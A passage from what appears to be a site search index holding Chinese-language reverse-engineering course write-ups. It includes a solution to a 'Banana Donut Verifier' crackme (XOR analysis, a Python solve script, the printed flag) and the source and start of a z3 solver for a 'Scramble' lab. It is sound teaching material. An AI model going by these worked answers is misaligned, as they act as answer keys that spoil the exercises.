░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \\x00\\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░░░░░░░ \\x00\\x00 ░░ \u0026#34;); puts(\u0026#34; ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \\x00\\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \\x00\\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░░░░░░░ \\x00\\x00 ░░ \u0026#34;); puts(\u0026#34; ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \\x00\\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \\x00\\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░░░░░░░ \\x00\\x00 ░░ \u0026#34;); puts(\u0026#34; ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \\x00\\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░░░░░░░ \\x00\\x00 ░░ \u0026#34;); puts(\u0026#34; ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \\x00\\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░░░░░░░ \\x00\\x00 ░░ \u0026#34;); puts(\u0026#34; ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \\x00\\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░░░░░░░ \\x00\\x00 ░░ \u0026#34;); puts(\u0026#34; ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \\x00\\x00\\x00\\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░░░░░░░ \\x00\\x00 ░░ \u0026#34;); puts(\u0026#34; ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ░ ░░░░░░░░ \\x00\\x00 ░░ \u0026#34;); puts(\u0026#34; ░ ░░░░░░░░ \\x00\\x00 ░░ \u0026#34;); puts(\u0026amp;icon[6760]); return 0LL; } :::\nRecon # 初步的基礎操作逆完之後，主要流程是這樣:\n先輸入1023個char 他會對這1023個char進行一些操作外，主要是運算甜甜圈怎麼畫(對float運算sin和cos) 把我們的input丟到verification function 把原本儲存在程式碼的key也丟到verification function 比對兩個return的結果 一樣就吐Donut likes your input!! :D 我這一題的想法是直接用上一次HW(crackme_vectorization)的思維嘗試找出他的邏輯，以下實驗結果都是在進入verification function之前的user_input\n首先我如果全部輸入\\x00 3D 3A 8B 8A 8A 8A 89 89 88 88 88 88 59 56 54 54 54 56 59 59 27 56 56 57 4B 4B 48 48 49 49 4E 4E 4B F9 F9 F8 07 07 07 05 04 07 07 06 01 01 02 02 01 01 00 B1 B5 BA BA BA BA BA A7 A7 A8 A8 A8 AB ... 如果輸入全部都是\\x10 2D 2A 9B 9A 9A 9A 99 99 98 98 98 98 49 46 44 44 44 46 49 49 37 46 46 47 5B 5B 58 58 59 59 5E 5E 5B E9 E9 E8 17 17 17 15 14 17 17 16 11 11 12 12 11 11 10 A1 A5 AA AA AA AA AA B7 B7 B8 B8 B8 BB ... 要比對的key 47 56 F8 BE FD FB A6 FB A7 FF F2 F2 0C 63 33 11 65 2F 18 21 69 63 35 25 2D 2E 2C 21 70 78 17 7A 0F 92 BE 99 54 48 43 35 75 52 48 36 57 34 32 3F 01 01 00 B1 B5 BA BA BA BA BA A7 A7 A8 A8 A8 AB ... 從以上的memory dump出來的結果就知道全部輸入\\x00和要比對的key只有前面48 bytes不一樣，但後面都一樣，而和全部都是\\x10的輸出結果比較發現都是差\\x10(不管正負)，因此我有大膽的想法，這該不會是XOR的操作ㄅ，經過比對果然無誤，所以我只要把要比對的key和全部都是\\x00的結果進行XOR就知道我應該輸入甚麼了\nExploit # root = \u0026#34;./Reverse/HW2/Banana Donut Verifier/\u0026#34; input_0x0 = open(root + \u0026#39;user_input_all_0.mem\u0026#39;, \u0026#39;rb\u0026#39;).read() real_key = open(root + \u0026#39;real_key.mem\u0026#39;, \u0026#39;rb\u0026#39;).read() # flag_file = open(root + \u0026#39;flag.mem\u0026#39;, \u0026#39;wb\u0026#39;) flag = b\u0026#39;\u0026#39; for i in range(len(real_key)): flag += bytes([real_key[i] ^ input_0x0[i]]) # flag_file.write(flag) # flag_file.close() print(\u0026#34;Exchange Flag is: \u0026#34; + flag.decode()) # Exchange Flag is: zls4wq/r/wzzU5gE1yAxN5crfedi91Y4DkGaSOD0qUO0V50= Flag: FLAG{d0_Y0u_l1k3_b4n4Na_d0Nut?}\n"},{"id":417,"href":"/security/course/ntu-cs/reverse/simple-reverse---0x272023-lab---scramble/","title":"Simple Reverse - 0x27(2023 Lab - Scramble)","section":"Securities","content":" Simple Reverse - 0x27(2023 Lab - Scramble) # Source code # :::spoiler scramble.py\nimport random def generate_scramble_pattern(pattern_length, max_shift, max_add_sub): scramble_pattern = [] for _ in range(random.randint(1, pattern_length)): operation = random.randint(0, 3) if operation == 0: sub_value = random.randint(1, max_add_sub) elif operation == 1: add_value = random.randint(1, max_add_sub) scramble_pattern.append((\u0026#39;add\u0026#39;, add_value)) elif operation == 2: sub_value = random.randint(1, max_add_sub) scramble_pattern.append((\u0026#39;sub\u0026#39;, sub_value)) elif operation == 3: shift_value = random.randint(1, max_shift) scramble_pattern.append((\u0026#39;lsh\u0026#39;, shift_value)) return scramble_pattern def apply_scramble_pattern(input_bytes, patterns): result = [] for i, operations in enumerate(patterns): src = input_bytes[i] for operation in operations: if operation is None: continue elif operation[0] == \u0026#39;add\u0026#39;: src += operation[1] elif operation[0] == \u0026#39;sub\u0026#39;: src -= operation[1] elif operation[0] == \u0026#39;lsh\u0026#39;: src \u0026lt;\u0026lt;= operation[1] src \u0026amp;= 0xffffffff result.append(src) return result k_FLAG = b\u0026#39;FLAG{REDACTED}\u0026#39; patterns = [generate_scramble_pattern(6, max_shift=10, max_add_sub=0xffff) for i in range(len(k_FLAG)) ] scrambled_result = apply_scramble_pattern(k_FLAG, patterns) print(\u0026#34;Input Bytes:\u0026#34;, k_FLAG, len(k_FLAG)) # REDACTED, 42 print(\u0026#34;Scramble Pattern:\u0026#34;, patterns) # [[(\u0026#39;sub\u0026#39;, 20935)], [(\u0026#39;sub\u0026#39;, 31575), (\u0026#39;lsh\u0026#39;, 9), (\u0026#39;add\u0026#39;, 45363), (\u0026#39;add\u0026#39;, 35372), (\u0026#39;sub\u0026#39;, 15465)], [(\u0026#39;add\u0026#39;, 19123), (\u0026#39;add\u0026#39;, 35260), (\u0026#39;sub\u0026#39;, 49421), (\u0026#39;lsh\u0026#39;, 8)], [(\u0026#39;lsh\u0026#39;, 1), (\u0026#39;sub\u0026#39;, 4977), (\u0026#39;sub\u0026#39;, 55837)], [(\u0026#39;add\u0026#39;, 16937)], [(\u0026#39;sub\u0026#39;, 56984), (\u0026#39;lsh\u0026#39;, 2), (\u0026#39;sub\u0026#39;, 32363), (\u0026#39;sub\u0026#39;, 46293)], [(\u0026#39;sub\u0026#39;, 94), (\u0026#39;sub\u0026#39;, 48860), (\u0026#39;sub\u0026#39;, 18342), (\u0026#39;lsh\u0026#39;, 3)], [(\u0026#39;add\u0026#39;, 37549), (\u0026#39;sub\u0026#39;, 36283), (\u0026#39;lsh\u0026#39;, 6), (\u0026#39;add\u0026#39;, 6253)], [(\u0026#39;add\u0026#39;, 34661), (\u0026#39;sub\u0026#39;, 13281), (\u0026#39;sub\u0026#39;, 64107)], [(\u0026#39;sub\u0026#39;, 8525), (\u0026#39;sub\u0026#39;, 30349), (\u0026#39;sub\u0026#39;, 26744)], [(\u0026#39;lsh\u0026#39;, 2), (\u0026#39;sub\u0026#39;, 18120), (\u0026#39;sub\u0026#39;, 63091), (\u0026#39;add\u0026#39;, 17287), (\u0026#39;sub\u0026#39;, 37618), (\u0026#39;add\u0026#39;, 2237)], [(\u0026#39;sub\u0026#39;, 48573), (\u0026#39;sub\u0026#39;, 4449), (\u0026#39;add\u0026#39;, 36013), (\u0026#39;sub\u0026#39;, 64051)], [(\u0026#39;add\u0026#39;, 10415), (\u0026#39;lsh\u0026#39;, 3), (\u0026#39;lsh\u0026#39;, 10)], [(\u0026#39;add\u0026#39;, 5676), (\u0026#39;lsh\u0026#39;, 3), (\u0026#39;lsh\u0026#39;, 10), (\u0026#39;add\u0026#39;, 32002), (\u0026#39;sub\u0026#39;, 60775)], [(\u0026#39;add\u0026#39;, 35939), (\u0026#39;sub\u0026#39;, 32666), (\u0026#39;sub\u0026#39;, 45639), (\u0026#39;add\u0026#39;, 2077), (\u0026#39;sub\u0026#39;, 16253)], [(\u0026#39;sub\u0026#39;, 30392), (\u0026#39;sub\u0026#39;, 26913), (\u0026#39;sub\u0026#39;, 14009), (\u0026#39;sub\u0026#39;, 62416)], [(\u0026#39;sub\u0026#39;, 15056), (\u0026#39;sub\u0026#39;, 40527)], [(\u0026#39;lsh\u0026#39;, 5)], [(\u0026#39;lsh\u0026#39;, 1), (\u0026#39;sub\u0026#39;, 16070)], [(\u0026#39;add\u0026#39;, 2045)], [(\u0026#39;lsh\u0026#39;, 8), (\u0026#39;add\u0026#39;, 37087), (\u0026#39;sub\u0026#39;, 22013), (\u0026#39;lsh\u0026#39;, 10), (\u0026#39;lsh\u0026#39;, 2)], [(\u0026#39;add\u0026#39;, 31880), (\u0026#39;sub\u0026#39;, 56557), (\u0026#39;lsh\u0026#39;, 6), (\u0026#39;lsh\u0026#39;, 5), (\u0026#39;lsh\u0026#39;, 8), (\u0026#39;add\u0026#39;, 15535)], [(\u0026#39;add\u0026#39;, 22937), (\u0026#39;add\u0026#39;, 4060)], [(\u0026#39;add\u0026#39;, 8462), (\u0026#39;sub\u0026#39;, 4463), (\u0026#39;sub\u0026#39;, 45810), (\u0026#39;lsh\u0026#39;, 1)], [(\u0026#39;sub\u0026#39;, 10144), (\u0026#39;lsh\u0026#39;, 8), (\u0026#39;lsh\u0026#39;, 5), (\u0026#39;lsh\u0026#39;, 1), (\u0026#39;lsh\u0026#39;, 8)], [(\u0026#39;add\u0026#39;, 49937), (\u0026#39;lsh\u0026#39;, 2), (\u0026#39;add\u0026#39;, 60982), (\u0026#39;sub\u0026#39;, 24799)], [(\u0026#39;lsh\u0026#39;, 4), (\u0026#39;add\u0026#39;, 53340), (\u0026#39;add\u0026#39;, 50619), (\u0026#39;sub\u0026#39;, 56111), (\u0026#39;add\u0026#39;, 6134), (\u0026#39;lsh\u0026#39;, 1)], [(\u0026#39;sub\u0026#39;, 22577), (\u0026#39;sub\u0026#39;, 50645)], [(\u0026#39;add\u0026#39;, 21265), (\u0026#39;sub\u0026#39;, 41440)], [(\u0026#39;add\u0026#39;, 63314), (\u0026#39;sub\u0026#39;, 45755), (\u0026#39;add\u0026#39;, 62216)], [(\u0026#39;sub\u0026#39;, 52616)], [(\u0026#39;add\u0026#39;, 21192)], [(\u0026#39;add\u0026#39;, 62573), (\u0026#39;sub\u0026#39;,18811)], [(\u0026#39;add\u0026#39;, 35452), (\u0026#39;sub\u0026#39;, 11573), (\u0026#39;sub\u0026#39;, 49079), (\u0026#39;sub\u0026#39;, 36361), (\u0026#39;sub\u0026#39;, 26862), (\u0026#39;lsh\u0026#39;, 9)], [(\u0026#39;add\u0026#39;, 13610), (\u0026#39;lsh\u0026#39;, 7), (\u0026#39;lsh\u0026#39;, 3), (\u0026#39;sub\u0026#39;, 28490), (\u0026#39;lsh\u0026#39;, 10), (\u0026#39;add\u0026#39;, 44742)], [(\u0026#39;lsh\u0026#39;, 10), (\u0026#39;sub\u0026#39;, 1797), (\u0026#39;sub\u0026#39;, 10564), (\u0026#39;add\u0026#39;, 12394)], [(\u0026#39;add\u0026#39;, 45165), (\u0026#39;lsh\u0026#39;, 10), (\u0026#39;sub\u0026#39;, 60610), (\u0026#39;sub\u0026#39;, 63002), (\u0026#39;sub\u0026#39;, 14851), (\u0026#39;lsh\u0026#39;, 1)], [(\u0026#39;add\u0026#39;, 34840), (\u0026#39;lsh\u0026#39;, 3), (\u0026#39;sub\u0026#39;, 16907)], [(\u0026#39;add\u0026#39;, 4404), (\u0026#39;lsh\u0026#39;, 3), (\u0026#39;lsh\u0026#39;, 7), (\u0026#39;lsh\u0026#39;, 6)], [(\u0026#39;lsh\u0026#39;, 6), (\u0026#39;add\u0026#39;, 51738), (\u0026#39;sub\u0026#39;, 24621), (\u0026#39;add\u0026#39;, 58646)], [(\u0026#39;lsh\u0026#39;, 1)], [(\u0026#39;add\u0026#39;, 29375), (\u0026#39;sub\u0026#39;, 419), (\u0026#39;add\u0026#39;, 2854), (\u0026#39;sub\u0026#39;, 11878), (\u0026#39;lsh\u0026#39;, 10), (\u0026#39;add\u0026#39;, 40151)], [(\u0026#39;add\u0026#39;, 22953)]] print(\u0026#34;Scrambled Result:\u0026#34;, scrambled_result) # [4294946431, 4278905078, 1286912, 4294906624, 17060, 4294661164, 4294429720, 94573, 4294924666, 4294901787, 4294868383, 4294886344, 86147072, 47247259, 4294910851, 4294833676, 4294911813, 3040, 4294951460, 2160, 171843584, 4734127, 27100, 4294883864, 884998144, 236375, 111420, 4294894192, 4294947222, 79889, 4294914775, 21308, 43873, 4249743360, 1477674694, 113697, 92442178, 262757, 295239680, 91843, 210, 20569303, 23078] ::: :::spoiler output.txt\n[[(\u0026#39;sub\u0026#39;, 20935)], [(\u0026#39;sub\u0026#39;, 31575), (\u0026#39;lsh\u0026#39;, 9), (\u0026#39;add\u0026#39;, 45363), (\u0026#39;add\u0026#39;, 35372), (\u0026#39;sub\u0026#39;, 15465)], [(\u0026#39;add\u0026#39;, 19123), (\u0026#39;add\u0026#39;, 35260), (\u0026#39;sub\u0026#39;, 49421), (\u0026#39;lsh\u0026#39;, 8)], [(\u0026#39;lsh\u0026#39;, 1), (\u0026#39;sub\u0026#39;, 4977), (\u0026#39;sub\u0026#39;, 55837)], [(\u0026#39;add\u0026#39;, 16937)], [(\u0026#39;sub\u0026#39;, 56984), (\u0026#39;lsh\u0026#39;, 2), (\u0026#39;sub\u0026#39;, 32363), (\u0026#39;sub\u0026#39;, 46293)], [(\u0026#39;sub\u0026#39;, 94), (\u0026#39;sub\u0026#39;, 48860), (\u0026#39;sub\u0026#39;, 18342), (\u0026#39;lsh\u0026#39;, 3)], [(\u0026#39;add\u0026#39;, 37549), (\u0026#39;sub\u0026#39;, 36283), (\u0026#39;lsh\u0026#39;, 6), (\u0026#39;add\u0026#39;, 6253)], [(\u0026#39;add\u0026#39;, 34661), (\u0026#39;sub\u0026#39;, 13281), (\u0026#39;sub\u0026#39;, 64107)], [(\u0026#39;sub\u0026#39;, 8525), (\u0026#39;sub\u0026#39;, 30349), (\u0026#39;sub\u0026#39;, 26744)], [(\u0026#39;lsh\u0026#39;, 2), (\u0026#39;sub\u0026#39;, 18120), (\u0026#39;sub\u0026#39;, 63091), (\u0026#39;add\u0026#39;, 17287), (\u0026#39;sub\u0026#39;, 37618), (\u0026#39;add\u0026#39;, 2237)], [(\u0026#39;sub\u0026#39;, 48573), (\u0026#39;sub\u0026#39;, 4449), (\u0026#39;add\u0026#39;, 36013), (\u0026#39;sub\u0026#39;, 64051)], [(\u0026#39;add\u0026#39;, 10415), (\u0026#39;lsh\u0026#39;, 3), (\u0026#39;lsh\u0026#39;, 10)], [(\u0026#39;add\u0026#39;, 5676), (\u0026#39;lsh\u0026#39;, 3), (\u0026#39;lsh\u0026#39;, 10), (\u0026#39;add\u0026#39;, 32002), (\u0026#39;sub\u0026#39;, 60775)], [(\u0026#39;add\u0026#39;, 35939), (\u0026#39;sub\u0026#39;, 32666), (\u0026#39;sub\u0026#39;, 45639), (\u0026#39;add\u0026#39;, 2077), (\u0026#39;sub\u0026#39;, 16253)], [(\u0026#39;sub\u0026#39;, 30392), (\u0026#39;sub\u0026#39;, 26913), (\u0026#39;sub\u0026#39;, 14009), (\u0026#39;sub\u0026#39;, 62416)], [(\u0026#39;sub\u0026#39;, 15056), (\u0026#39;sub\u0026#39;, 40527)], [(\u0026#39;lsh\u0026#39;, 5)], [(\u0026#39;lsh\u0026#39;, 1), (\u0026#39;sub\u0026#39;, 16070)], [(\u0026#39;add\u0026#39;, 2045)], [(\u0026#39;lsh\u0026#39;, 8), (\u0026#39;add\u0026#39;, 37087), (\u0026#39;sub\u0026#39;, 22013), (\u0026#39;lsh\u0026#39;, 10), (\u0026#39;lsh\u0026#39;, 2)], [(\u0026#39;add\u0026#39;, 31880), (\u0026#39;sub\u0026#39;, 56557), (\u0026#39;lsh\u0026#39;, 6), (\u0026#39;lsh\u0026#39;, 5), (\u0026#39;lsh\u0026#39;, 8), (\u0026#39;add\u0026#39;, 15535)], [(\u0026#39;add\u0026#39;, 22937), (\u0026#39;add\u0026#39;, 4060)], [(\u0026#39;add\u0026#39;, 8462), (\u0026#39;sub\u0026#39;, 4463), (\u0026#39;sub\u0026#39;, 45810), (\u0026#39;lsh\u0026#39;, 1)], [(\u0026#39;sub\u0026#39;, 10144), (\u0026#39;lsh\u0026#39;, 8), (\u0026#39;lsh\u0026#39;, 5), (\u0026#39;lsh\u0026#39;, 1), (\u0026#39;lsh\u0026#39;, 8)], [(\u0026#39;add\u0026#39;, 49937), (\u0026#39;lsh\u0026#39;, 2), (\u0026#39;add\u0026#39;, 60982), (\u0026#39;sub\u0026#39;, 24799)], [(\u0026#39;lsh\u0026#39;, 4), (\u0026#39;add\u0026#39;, 53340), (\u0026#39;add\u0026#39;, 50619), (\u0026#39;sub\u0026#39;, 56111), (\u0026#39;add\u0026#39;, 6134), (\u0026#39;lsh\u0026#39;, 1)], [(\u0026#39;sub\u0026#39;, 22577), (\u0026#39;sub\u0026#39;, 50645)], [(\u0026#39;add\u0026#39;, 21265), (\u0026#39;sub\u0026#39;, 41440)], [(\u0026#39;add\u0026#39;, 63314), (\u0026#39;sub\u0026#39;, 45755), (\u0026#39;add\u0026#39;, 62216)], [(\u0026#39;sub\u0026#39;, 52616)], [(\u0026#39;add\u0026#39;, 21192)], [(\u0026#39;add\u0026#39;, 62573), (\u0026#39;sub\u0026#39;,18811)], [(\u0026#39;add\u0026#39;, 35452), (\u0026#39;sub\u0026#39;, 11573), (\u0026#39;sub\u0026#39;, 49079), (\u0026#39;sub\u0026#39;, 36361), (\u0026#39;sub\u0026#39;, 26862), (\u0026#39;lsh\u0026#39;, 9)], [(\u0026#39;add\u0026#39;, 13610), (\u0026#39;lsh\u0026#39;, 7), (\u0026#39;lsh\u0026#39;, 3), (\u0026#39;sub\u0026#39;, 28490), (\u0026#39;lsh\u0026#39;, 10), (\u0026#39;add\u0026#39;, 44742)], [(\u0026#39;lsh\u0026#39;, 10), (\u0026#39;sub\u0026#39;, 1797), (\u0026#39;sub\u0026#39;, 10564), (\u0026#39;add\u0026#39;, 12394)], [(\u0026#39;add\u0026#39;, 45165), (\u0026#39;lsh\u0026#39;, 10), (\u0026#39;sub\u0026#39;, 60610), (\u0026#39;sub\u0026#39;, 63002), (\u0026#39;sub\u0026#39;, 14851), (\u0026#39;lsh\u0026#39;, 1)], [(\u0026#39;add\u0026#39;, 34840), (\u0026#39;lsh\u0026#39;, 3), (\u0026#39;sub\u0026#39;, 16907)], [(\u0026#39;add\u0026#39;, 4404), (\u0026#39;lsh\u0026#39;, 3), (\u0026#39;lsh\u0026#39;, 7), (\u0026#39;lsh\u0026#39;, 6)], [(\u0026#39;lsh\u0026#39;, 6), (\u0026#39;add\u0026#39;, 51738), (\u0026#39;sub\u0026#39;, 24621), (\u0026#39;add\u0026#39;, 58646)], [(\u0026#39;lsh\u0026#39;, 1)], [(\u0026#39;add\u0026#39;, 29375), (\u0026#39;sub\u0026#39;, 419), (\u0026#39;add\u0026#39;, 2854), (\u0026#39;sub\u0026#39;, 11878), (\u0026#39;lsh\u0026#39;, 10), (\u0026#39;add\u0026#39;, 40151)], [(\u0026#39;add\u0026#39;, 22953)]] [4294946431, 4278905078, 1286912, 4294906624, 17060, 4294661164, 4294429720, 94573, 4294924666, 4294901787, 4294868383, 4294886344, 86147072, 47247259, 4294910851, 4294833676, 4294911813, 3040, 4294951460, 2160, 171843584, 4734127, 27100, 4294883864, 884998144, 236375, 111420, 4294894192, 4294947222, 79889, 4294914775, 21308, 43873, 4249743360, 1477674694, 113697, 92442178, 262757, 295239680, 91843, 210, 20569303, 23078] :::\nRecon # 這一題先看source code會發現他做了一連串的scramble動作，包含加減和移位，而次數也不一定，他主要是針對flag中的每一個字元都做1~6次不等的操作，可能是加也可能是減甚至是移位，不過題目也有給我們這些pattern所以應該是可以直接透過這些pattern進行還原，但我們可以用z3下一大堆constraint就可以不用那麼麻煩了\nz3的大致步驟:\n建立一個solver 建立符號 - 以此lab來說就是建立43個符號對應每一個flag字元 加上constraint - 以此lab來說每一個flag字元都應該限制在空白到0x7f之間，另外還要加上每一個符號(就是flag字元)，經過我們已知的scramble pattern之後應該要是最後的target 判斷有無解，如果有的話就把每一個符號的值取出來 Exploit # from z3 import * patters = [[(\u0026#39;sub\u0026#39;, 20935)], [(\u0026#39;sub\u0026#39;, 31575), (\u0026#39;lsh\u0026#39;, 9), (\u0026#39;add\u0026#39;, 45363), (\u0026#39;add\u0026#39;, 35372), (\u0026#39;sub\u0026#39;, 15465)], [(\u0026#39;add\u0026#39;, 19123), (\u0026#39;add\u0026#39;, 35260), (\u0026#39;sub\u0026#39;, 49421), (\u0026#39;lsh\u0026#39;, 8)], [(\u0026#39;lsh\u0026#39;, 1), (\u0026#39;sub\u0026#39;, 4977), (\u0026#39;sub\u0026#39;, 55837)], [(\u0026#39;add\u0026#39;, 16937)], [(\u0026#39;sub\u0026#39;, 56984), (\u0026#39;lsh\u0026#39;, 2), (\u0026#39;sub\u0026#39;, 32363), (\u0026#39;sub\u0026#39;, 46293)], [(\u0026#39;sub\u0026#39;, 94), (\u0026#39;sub\u0026#39;, 48860), (\u0026#39;sub\u0026#39;, 18342), (\u0026#39;lsh\u0026#39;, 3)], [(\u0026#39;add\u0026#39;, 37549), (\u0026#39;sub\u0026#39;, 36283), (\u0026#39;lsh\u0026#39;, 6), (\u0026#39;add\u0026#39;, 6253)], [(\u0026#39;add\u0026#39;, 34661), (\u0026#39;sub\u0026#39;, 13281), (\u0026#39;sub\u0026#39;, 64107)], [(\u0026#39;sub\u0026#39;, 8525), (\u0026#39;sub\u0026#39;, 30349), (\u0026#39;sub\u0026#39;, 26744)], [(\u0026#39;lsh\u0026#39;, 2), (\u0026#39;sub\u0026#39;, 18120), (\u0026#39;sub\u0026#39;, 63091), (\u0026#39;add\u0026#39;, 17287), (\u0026#39;sub\u0026#39;, 37618), (\u0026#39;add\u0026#39;, 2237)], [(\u0026#39;sub\u0026#39;, 48573), (\u0026#39;sub\u0026#39;, 4449), (\u0026#39;add\u0026#39;, 36013), (\u0026#39;sub\u0026#39;, 64051)], [(\u0026#39;add\u0026#39;, 10415), (\u0026#39;lsh\u0026#39;, 3), (\u0026#39;lsh\u0026#39;, 10)], [(\u0026#39;add\u0026#39;, 5676), (\u0026#39;lsh\u0026#39;, 3), (\u0026#39;lsh\u0026#39;, 10), (\u0026#39;add\u0026#39;, 32002), (\u0026#39;sub\u0026#39;, 60775)], [(\u0026#39;add\u0026#39;, 35939), (\u0026#39;sub\u0026#39;, 32666), (\u0026#39;sub\u0026#39;, 45639), (\u0026#39;add\u0026#39;, 2077), (\u0026#39;sub\u0026#39;, 16253)], [(\u0026#39;sub\u0026#39;, 30392), (\u0026#39;sub\u0026#39;, 26913), (\u0026#39;sub\u0026#39;, 14009), (\u0026#39;sub\u0026#39;, 62416)], [(\u0026#39;sub\u0026#39;, 15056), (\u0026#39;sub\u0026#39;, 40527)], [(\u0026#39;lsh\u0026#39;, 5)], [(\u0026#39;lsh\u0026#39;, 1), (\u0026#39;sub\u0026#39;, 16070)], [(\u0026#39;add\u0026#39;, 2045)], [(\u0026#39;lsh\u0026#39;, 8), (\u0026#39;add\u0026#39;, 37087), (\u0026#39;sub\u0026#39;, 22013), (\u0026#39;lsh\u0026#39;, 10), (\u0026#39;lsh\u0026#39;, 2)], [(\u0026#39;add\u0026#39;, 31880), (\u0026#39;sub\u0026#39;, 56557), (\u0026#39;lsh\u0026#39;, 6), (\u0026#39;lsh\u0026#39;, 5), (\u0026#39;lsh\u0026#39;, 8), (\u0026#39;add\u0026#39;, 15535)], [(\u0026#39;add\u0026#39;, 22937), (\u0026#39;add\u0026#39;, 4060)], [(\u0026#39;add\u0026#39;, 8462), (\u0026#39;sub\u0026#39;, 4463), (\u0026#39;sub\u0026#39;, 45810), (\u0026#39;lsh\u0026#39;, 1)], [(\u0026#39;sub\u0026#39;, 10144), (\u0026#39;lsh\u0026#39;, 8), (\u0026#39;lsh\u0026#39;, 5), (\u0026#39;lsh\u0026#39;, 1), (\u0026#39;lsh\u0026#39;, 8)], [(\u0026#39;add\u0026#39;, 49937), (\u0026#39;lsh\u0026#39;, 2), (\u0026#39;add\u0026#39;, 60982), (\u0026#39;sub\u0026#39;, 24799)], [(\u0026#39;lsh\u0026#39;, 4), (\u0026#39;add\u0026#39;, 53340), (\u0026#39;add\u0026#39;, 50619), (\u0026#39;sub\u0026#39;, 56111), (\u0026#39;add\u0026#39;, 6134), (\u0026#39;lsh\u0026#39;, 1)], [(\u0026#39;sub\u0026#39;, 22577), (\u0026#39;sub\u0026#39;, 50645)], [(\u0026#39;add\u0026#39;, 21265), (\u0026#39;sub\u0026#39;, 41440)], [(\u0026#39;add\u0026#39;, 63314), (\u0026#39;sub\u0026#39;, 45755), (\u0026#39;add\u0026#39;, 62216)], [(\u0026#39;sub\u0026#39;, 52616)], [(\u0026#39;add\u0026#39;, 21192)], [(\u0026#39;add\u0026#39;, 62573), (\u0026#39;sub\u0026#39;,18811)], [(\u0026#39;add\u0026#39;, 35452), (\u0026#39;sub\u0026#39;, 11573), (\u0026#39;sub\u0026#39;, 49079), (\u0026#39;sub\u0026#39;, 36361), (\u0026#39;sub\u0026#39;, 26862), (\u0026#39;lsh\u0026#39;, 9)], [(\u0026#39;add\u0026#39;, 13610), (\u0026#39;lsh\u0026#39;, 7), (\u0026#39;lsh\u0026#39;, 3), (\u0026#39;sub\u0026#39;, 28490), (\u0026#39;lsh\u0026#39;, 10), (\u0026#39;add\u0026#39;, 44742)], [(\u0026#39;lsh\u0026#39;, 10), (\u0026#39;sub\u0026#39;, 1797), (\u0026#39;sub\u0026#39;, 10564), (\u0026#39;add\u0026#39;, 12394)], [(\u0026#39;add\u0026#39;, 45165), (\u0026#39;lsh\u0026#39;, 10), (\u0026#39;sub\u0026#39;, 60610), (\u0026#39;sub\u0026#39;, 63002), (\u0026#39;sub\u0026#39;, 14851), (\u0026#39;lsh\u0026#39;, 1)], [(\u0026#39;add\u0026#39;, 34840), (\u0026#39;lsh\u0026#39;, 3), (\u0026#39;sub\u0026#39;, 16907)], [(\u0026#39;add\u0026#39;, 4404), (\u0026#39;lsh\u0026#39;, 3), (\u0026#39;lsh\u0026#39;, 7), (\u0026#39;lsh\u0026#39;, 6)], [(\u0026#39;lsh\u0026#39;, 6), (\u0026#39;add\u0026#39;, 51738), (\u0026#39;sub\u0026#39;, 24621), (\u0026#39;add\u0026#39;, 58646)], [(\u0026#39;lsh\u0026#39;, 1)], 